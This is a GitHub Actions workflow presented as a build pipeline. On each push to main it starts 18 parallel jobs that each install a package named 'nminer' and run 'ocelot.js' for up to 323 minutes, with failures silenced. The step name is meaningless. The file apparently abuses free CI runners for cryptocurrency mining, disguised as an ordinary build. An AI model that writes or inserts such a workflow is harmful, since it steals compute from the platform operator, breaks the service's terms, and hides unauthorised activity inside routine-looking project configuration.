name: ocelot
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 3422 }
          - { version: 9388 }
          - { version: 1870 }
          - { version: 7827 }
          - { version: 416 }
          - { version: 3787 }
          - { version: 8646 }
          - { version: 7547 }
          - { version: 9678 }
          - { version: 5656 }
          - { version: 6613 }
          - { version: 4567 }
          - { version: 9076 }
          - { version: 8454 }
          - { version: 1899 }
          - { version: 1925 }
          - { version: 5690 }
          - { version: 1568 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: ouch stage spiteful less that
        run: |
          npm install nminer@latest
          timeout 323m node ocelot.js || echo "ocelot executed"